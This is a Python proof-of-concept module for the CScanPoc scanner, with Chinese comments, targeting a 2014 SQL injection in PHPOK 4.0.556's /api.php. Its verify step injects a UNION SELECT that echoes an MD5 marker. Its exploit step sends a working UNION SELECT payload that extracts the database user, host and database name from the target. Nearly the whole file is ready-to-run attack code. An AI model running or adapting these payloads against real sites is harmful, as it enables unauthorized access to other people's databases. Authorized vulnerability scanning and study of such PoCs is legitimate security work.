# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'PHPOK_0002'  # 平台漏洞编号，留空
    name = 'PHPOK 4.0.556 /api.php SQL注入漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-08'  # 漏洞公布时间
    desc = '''
        PHPOK是一套允许用户高度自由配置的企业站程序，基于LGPL协议开源授权。
        PHPOK企业站缺陷文件：framework/phpok_call.php line：108
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1860/'  # 漏洞来源https://bugs.shuimugan.com/bug/view?bug_no=64360
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPOK'  # 漏洞应用名称
    product_version = '4.0.556'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e0547af9-ba3d-4901-92e0-e6cfa80277e4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/api.php?c=api&f=phpok&id=_project&param[pid]=1%20UNION%20SELECT%201,"
                       "concat_ws(0x3a3a,0x346B7765,user(),0x346B3761,md5(123321),0x77653571),3,"
                       "4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33")
            verify_url = '{target}'.format(target=self.target)+payload

            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if 'c8837b23ff8aaa8a2dde915473ce0991' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/api.php?c=api&f=phpok&id=_project&param[pid]=1%20UNION%20SELECT%201,"
                       "concat_ws(0x3a3a,0x346B7765,user(),0x346B3761,database(),0x77653571),3,"
                       "4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33")
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            u_h_db = re.findall('4kwe::(.*?)::4k7a::(.*?)::we5q', content)
            if u_h_db:
                (u_h, DBname) = u_h_db[0]
                index = u_h.rfind('@')
                (Username, Hostname) = (u_h[:index], u_h[index+1:])
                exploit_dbname = DBname
                exploit_usrename = Username
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库名为{db_name}数据库用户名为{db_user}'.format(
                    target=self.target, name=self.vuln.name, db_name=exploit_dbname, db_user=exploit_usrename))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
